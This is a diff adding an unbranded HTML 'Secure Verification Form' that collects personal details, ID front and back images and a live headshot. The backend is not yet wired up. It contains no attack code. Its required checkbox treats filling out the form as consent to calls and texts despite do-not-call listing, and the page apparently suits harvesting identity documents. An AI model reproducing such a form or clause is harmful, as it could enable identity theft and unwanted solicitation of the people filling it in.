@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Verification Form</title>
+    <style>
+        :root {
+            /* REPLACE THE URL BELOW TO CHANGE YOUR BACKGROUND PHOTO */
+            --bg-image: url('https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=2564&auto=format&fit=crop'); 
+            
+            --neon-cyan: #00f3ff;
+            --neon-magenta: #ff00ff;
+            --neon-purple: #bc13fe;
+            --glass-bg: rgba(10, 10, 15, 0.65);
+            --glass-border: rgba(255, 255, 255, 0.1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-image: var(--bg-image);
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+        }
+
+        .glass-container {
+            background: var(--glass-bg);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 650px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5),
+                        0 0 20px rgba(0, 243, 255, 0.15);
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Top highlight glow */
+        .glass-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple), var(--neon-magenta));
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 30px;
+            font-weight: 600;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            background: linear-gradient(90deg, #fff, var(--neon-cyan));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            color: #ccc;
+            letter-spacing: 0.5px;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"],
+        input[type="date"] {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="tel"]:focus,
+        input[type="date"]:focus {
+            border-color: var(--neon-cyan);
+            box-shadow: 0 0 10px rgba(0, 243, 255, 0.2);
+        }
+
+        .file-upload-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 15px;
+            margin-top: 30px;
+            margin-bottom: 30px;
+        }
+
+        @media (min-width: 600px) {
+            .file-upload-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+
+        .file-upload-box {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px dashed var(--neon-purple);
+            border-radius: 10px;
+            padding: 20px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .file-upload-box:hover {
+            border-color: var(--neon-magenta);
+            background: rgba(255, 0, 255, 0.05);
+        }
+
+        .file-upload-box input[type="file"] {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+        }
+
+        .file-upload-label {
+            font-size: 0.85rem;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .file-icon {
+            font-size: 1.5rem;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            margin-bottom: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 3px solid var(--neon-cyan);
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            margin-top: 4px;
+            width: 18px;
+            height: 18px;
+            accent-color: var(--neon-magenta);
+            cursor: pointer;
+        }
+
+        .checkbox-group label {
+            margin-bottom: 0;
+            font-size: 0.9rem;
+            line-height: 1.4;
+            color: #ddd;
+            cursor: pointer;
+        }
+
+        button.submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, var(--neon-purple), var(--neon-magenta));
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 1.1rem;
+            font-weight: bold;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            margin-top: 10px;
+        }
+
+        button.submit-btn:hover {
+            box-shadow: 0 0 20px rgba(255, 0, 255, 0.4);
+            transform: translateY(-2px);
+        }
+
+        .file-name-display {
+            font-size: 0.75rem;
+            color: var(--neon-cyan);
+            margin-top: 8px;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="glass-container">
+        <h2>Secure Verification Form</h2>
+        <form id="verificationForm">
+            
+            <div class="form-group">
+                <label for="fullName">Full Name</label>
+                <input type="text" id="fullName" name="fullName" required placeholder="John Doe">
+            </div>
+
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" required placeholder="john@example.com">
+            </div>
+
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" name="phone" required placeholder="(555) 555-5555">
+            </div>
+
+            <div class="form-group">
+                <label for="address">Full Address</label>
+                <input type="text" id="address" name="address" required placeholder="123 Main St, City, ST 12345">
+            </div>
+
+            <div class="form-group">
+                <label for="birthday">Birthday</label>
+                <input type="date" id="birthday" name="birthday" required>
+            </div>
+
+            <div class="file-upload-grid">
+                <div class="file-upload-box">
+                    <input type="file" id="idFront" name="idFront" accept="image/*" required onchange="updateFileName(this, 'idFrontName')">
+                    <div class="file-upload-label">
+                        <span class="file-icon">🪪</span>
+                        <span>ID Front</span>
+                    </div>
+                    <div id="idFrontName" class="file-name-display"></div>
+                </div>
+
+                <div class="file-upload-box">
+                    <input type="file" id="idBack" name="idBack" accept="image/*" required onchange="updateFileName(this, 'idBackName')">
+                    <div class="file-upload-label">
+                        <span class="file-icon">🪪</span>
+                        <span>ID Back</span>
+                    </div>
+                    <div id="idBackName" class="file-name-display"></div>
+                </div>
+
+                <div class="file-upload-box">
+                    <!-- capture="user" prompts mobile devices to open the front-facing camera -->
+                    <input type="file" id="headshot" name="headshot" accept="image/*" capture="user" required onchange="updateFileName(this, 'headshotName')">
+                    <div class="file-upload-label">
+                        <span class="file-icon">📸</span>
+                        <span>Live Headshot</span>
+                    </div>
+                    <div id="headshotName" class="file-name-display"></div>
+                </div>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="contactConsent" name="contactConsent" required>
+                <label for="contactConsent">I have agreed by filling out the form to be contacted via text, call, or email even if I am on a national do not call list.</label>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="ageConsent" name="ageConsent" required>
+                <label for="ageConsent">By checking the box I agree that I am of age.</label>
+            </div>
+
+            <button type="submit" class="submit-btn">Submit Verification</button>
+
+        </form>
+    </div>
+
+    <script>
+        // Simple script to show the selected file name in the upload boxes
+        function updateFileName(input, displayId) {
+            const displayElement = document.getElementById(displayId);
+            if (input.files && input.files[0]) {
+                displayElement.textContent = input.files[0].name;
+            } else {
+                displayElement.textContent = '';
+            }
+        }
+
+        // Prevent default submission for now until backend is wired up
+        document.getElementById('verificationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert('Frontend validation complete. Ready to send to backend!');
+            // Backend logic will go here later
+        });
+    </script>
+</body>
+</html>
